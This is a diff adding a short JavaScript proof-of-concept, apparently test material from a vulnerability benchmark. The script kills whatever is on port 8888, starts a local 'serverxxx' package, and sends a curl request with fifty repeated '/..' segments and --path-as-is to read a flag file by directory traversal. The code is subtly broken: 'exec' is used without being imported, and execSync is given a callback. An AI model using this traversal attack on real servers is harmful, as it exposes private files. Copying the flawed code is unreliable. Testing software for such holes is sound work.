@@ -1,0 +1,37 @@
+function exploitFunction() {
+  const path = require("path");
+  const { sleep } = require("sleep");
+  const pathToFlag = path.resolve(__dirname, "../flag.html");
+
+  function genstr(n) {
+    return "/..".repeat(n) + pathToFlag;
+  }
+
+  afterAll(() => {
+    try {
+      execSync("fuser -k 8888/tcp");
+    } catch (e) {}
+  });
+
+  const { execSync } = require("child_process");
+
+  try {
+    execSync("fuser -k 8888/tcp", () => {});
+  } catch (e) {}
+
+  const server = "node ./node_modules/serverxxx/index.js";
+
+  let exe = exec(server, (error, stdout) => {
+    if (error) throw error;
+    sleep.sleep(2);
+    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${genstr(50)}"`;
+    exec(attack_string, (error, stdout) => {
+      if (error) throw error;
+      return stdout;
+    });
+  });
+
+  return exe;
+}
+
+module.exports = { exploitFunction };
